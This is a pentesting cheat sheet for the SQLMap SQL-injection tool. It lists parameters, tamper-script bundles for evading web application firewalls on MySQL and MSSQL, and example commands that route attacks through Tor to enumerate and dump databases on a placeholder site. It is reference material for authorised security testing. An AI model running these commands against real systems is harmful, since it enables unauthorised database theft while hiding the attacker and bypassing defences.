# SQLMap

### SQLMap parameters

```
-u: URL to attack
-r: Request file
-p: Parameter to 
-v: Verbosity level (0-6, default 1
proxy: Use a proxy to connect to target URL
--tor: Use Tor anonymity network
--random-agent: Use a random user agent
--level: Level of tests to perform (1-5, default 1)
--risk: Risk of tests to perform (1-3, default 1)
--batch: Never ask for user input, use the default behavior
--is-dba: Check if user is DBA admin
--tamper: Select one or multiple tampers to use
--dbms: Force back-end DBMS to provided value
--flush-session: Flush session files for current target
--technique: SQL Injection techniques to use (default "BEUSTQ")
	B: Boolean-based blind
	E: Error-based blind
	U: Union query-based
	S: Stacked queries
	T: Time-based blind
	Q: Inline queries
--dbs: Check for available DBs
--tables: Check tables for a selected DB
--dump: Dump a selected table
-D: Select a DB
-T: Select a table
```

### Recommended tampers for specific backend

&#x20;Not recommended to use all at the same time

#### General purpose

```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

#### MySQL

```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

#### MSSQL

```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### Usage examples

```bash
#Attack to 'id' parameter using request file forcing to MySQL back-end. List databases
sqlmap -r request -p id --batch --level 5 --risk 2 --dbms=MySQL --dbs

#Attack to 'id' parameter of 'http://web.com' URL using Tor network. List tables of 'Users' database
sqlmap -u https://web.com/user?id=1 --batch --tor -D Users --tables

#Attack to 'position' parameter of 'http://web.com' URL using three tampers. List databases
sqlmap -u https://web.com/user?id=1&position=100 -p position --batch --dbs --tamper=between,charencode,space2comment
```
